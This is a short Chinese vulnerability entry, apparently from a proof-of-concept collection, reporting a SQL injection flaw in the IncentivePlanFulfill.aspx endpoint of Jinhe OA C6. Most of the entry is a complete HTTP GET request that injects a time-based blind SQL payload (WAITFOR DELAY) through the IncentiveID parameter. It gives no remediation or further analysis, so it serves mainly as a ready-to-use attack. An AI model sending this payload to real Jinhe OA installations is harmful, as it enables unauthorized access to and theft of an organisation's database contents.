**漏洞描述：**

金和OA C6 IncentivePlanFulfill.aspx接口存在SQL注入漏洞，攻击者可以注入恶意SQL语句恶意获取数据库数据。

**影响版本：**

金和OA

**Payload：**

```yaml
GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1WAITFOR+DELAY+%270:0:6%27--&TVersion=1 HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: close
Cookie: ASP.NET_SessionId=0uha1u0nhrn4meghddjiwu0y
Accept-Encoding: gzip
```

---
